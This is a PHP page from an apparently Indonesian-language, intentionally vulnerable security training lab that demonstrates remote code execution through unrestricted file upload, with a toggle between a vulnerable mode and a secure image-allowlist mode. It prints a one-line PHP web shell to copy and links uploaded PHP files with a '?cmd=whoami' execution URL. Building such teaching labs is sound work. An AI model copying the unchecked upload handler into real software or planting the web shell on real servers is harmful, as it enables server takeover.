<?php
require_once __DIR__ . '/../../includes/functions.php';

$currentPage = 'upload.php';
$pageTitle = 'File Upload to RCE';
$pageSubtitle = 'Remote Code Execution via File Upload (High security)';

$secure = isSecureMode('rce_upload');

if (isset($_POST['toggle'])) {
    toggleSetting('rce_upload');
}

$result = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $name = basename($file['name']);
    $ext  = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $target = UPLOAD_DIR . $name;

    if (!$secure) {
        // Vulnerable: hanya cek ukuran, tanpa validasi isi/ekstensi
        logActivity('upload', "File '$name' di-upload (mode vulnerable), ext: $ext");
        if (move_uploaded_file($file['tmp_name'], $target)) {
            logPayload('uploaded_file:' . $name, 'rce_upload');
            $result = [
                'status' => 'success',
                'msg'    => "File <strong>$name</strong> berhasil di-upload.",
                'path'   => $name,
                'note'   => 'Payload PHP seperti shell tetap diterima. Akses langsung: ' . getBaseUrl() . '/uploads/' . urlencode($name)
            ];
        } else {
            $result = ['status' => 'error', 'msg' => 'Upload gagal.'];
        }
    } else {
        // Secure: allowlist ekstensi gambar + verifikasi MIME
        $allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
        if (!in_array($ext, $allowed, true)) {
            $result = ['status' => 'error', 'msg' => "Ekstensi <strong>.$ext</strong> diblokir. Hanya gambar yang diizinkan."];
        } elseif (!getimagesize($file['tmp_name'])) {
            $result = ['status' => 'error', 'msg' => 'File bukan gambar yang valid (MIME tidak cocok).'];
        } else {
            $newname = uniqid('img_', true) . '.' . $ext;
            $target = UPLOAD_DIR . $newname;
            move_uploaded_file($file['tmp_name'], $target);
            logActivity('upload_safe', "Gambar '$name' disimpan sebagai '$newname' (mode secure)");
            $result = ['status' => 'success', 'msg' => "Gambar aman ter-upload sebagai <strong>$newname</strong>."];
        }
    }
}

$uploads = glob(UPLOAD_DIR . '*');
$uploads = is_array($uploads) ? array_map('basename', $uploads) : [];

$vulnCode = <<<'PHP'
// VULNERABLE - hanya cek ukuran, ekstensi bebas
move_uploaded_file($_FILES['file']['tmp_name'],
                   $uploadDir . $_FILES['file']['name']);
// .php tetap diterima => RCE
PHP;

$secureCode = <<<'PHP'
// SECURE - allowlist ekstensi + verifikasi MIME
$allowed = ['jpg','png','gif'];
if (!in_array($ext, $allowed)) die('ditolak');
if (!getimagesize($_FILES['file']['tmp_name'])) die('bukan gambar');
PHP;

ob_start();
?>
<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128228;</span> Upload File</h3>
        <div style="display:flex;gap:10px;align-items:center;">
            <?php echo getSecurityBadge('high'); ?>
            <?php echo getModeBadge($secure); ?>
        </div>
    </div>
    <div class="card-body">
        <?php if ($secure): ?>
            <div class="alert alert-success"><span class="alert-icon">&#10004;</span>
                <div><strong>Mode SECURE aktif.</strong> Hanya ekstensi gambar yang diizinkan &amp; isi file diverifikasi.</div>
            </div>
        <?php else: ?>
            <div class="alert alert-danger"><span class="alert-icon">&#9888;</span>
                <div><strong>Mode VULNERABLE aktif.</strong> File <code>.php</code> bisa di-upload &mdash; akses langsung untuk eksekusi (RCE).</div>
            </div>
        <?php endif; ?>

        <form method="post" action="/rce/upload.php" enctype="multipart/form-data">
            <div class="floating-label">
                <input type="file" name="file" id="file" required style="padding-top:18px;color:transparent;">
                <label for="file">Pilih file</label>
            </div>
            <button type="submit" class="btn btn-primary">&#128228; Upload</button>
        </form>
        <form method="post" action="/rce/upload.php">
            <input type="hidden" name="toggle" value="1">
            <button type="submit" class="btn <?php echo $secure ? 'btn-danger' : 'btn-success'; ?>">
                <?php echo $secure ? '&#128683; Beralih ke Vulnerable' : '&#128274; Beralih ke Secure'; ?>
            </button>
        </form>

        <div class="card" style="margin-top:16px;margin-bottom:0;">
            <div class="card-header">
                <h3><span class="card-icon">&#128736;</span> Buat File PHP WebShell</h3>
            </div>
            <div class="card-body">
                <p class="small">Simpan sebagai <code>shell.php</code> lalu upload di mode vulnerable:</p>
                <div class="terminal" id="shell-code" style="margin-top:8px;"><?php echo e("<?php system(\$_GET['cmd']); ?>"); ?></div>
                <button class="btn btn-outline mt-2" data-copy="#shell-code">Copy</button>
                <p class="small" style="margin-top:10px;">Akses setelah upload: <code><?php echo e(getBaseUrl()); ?>/uploads/shell.php?cmd=whoami</code></p>
            </div>
        </div>
    </div>
</div>

<?php if ($result): ?>
<div class="alert <?php echo $result['status'] === 'success' ? 'alert-success' : 'alert-danger'; ?>">
    <span class="alert-icon"><?php echo $result['status'] === 'success' ? '&#10004;' : '&#9888;'; ?></span>
    <div>
        <strong><?php echo $result['status'] === 'success' ? 'Upload berhasil' : 'Upload ditolak'; ?></strong><br>
        <?php echo $result['msg']; ?>
        <?php if (isset($result['note'])): ?><br><span class="small"><?php echo $result['note']; ?></span><?php endif; ?>
    </div>
</div>
<?php endif; ?>

<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128193;</span> File di Folder Uploads</h3>
        <span class="badge badge-primary"><?php echo count($uploads); ?> file</span>
    </div>
    <div class="card-body">
        <?php if (count($uploads) === 0): ?>
            <p class="text-muted">Kosong.</p>
        <?php else: ?>
            <table>
                <thead><tr><th>File</th><th>Aksi</th></tr></thead>
                <tbody>
                    <?php foreach ($uploads as $f): ?>
                    <tr>
                        <td><code><?php echo e($f); ?></code></td>
                        <td>
                            <?php if (preg_match('/\.(php|phtml|php5|pht)$/i', $f)): ?>
                                <a href="/uploads/<?php echo urlencode($f); ?>?cmd=whoami" class="text-danger small" target="_blank">&#9889; Execute (?cmd=whoami)</a>
                            <?php else: ?>
                                <a href="/uploads/<?php echo urlencode($f); ?>" class="text-primary small" target="_blank">&#128279; Buka</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>
    </div>
</div>

<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128295;</span> Perbandingan Kode</h3>
    </div>
    <div class="card-body flex gap-2">
        <div style="flex:1;"><?php echo codePreview('vulnerable', $vulnCode); ?></div>
        <div style="flex:1;"><?php echo codePreview('patched', $secureCode); ?></div>
    </div>
</div>
<?php
$content = ob_get_clean();
require __DIR__ . '/../../includes/layout.php';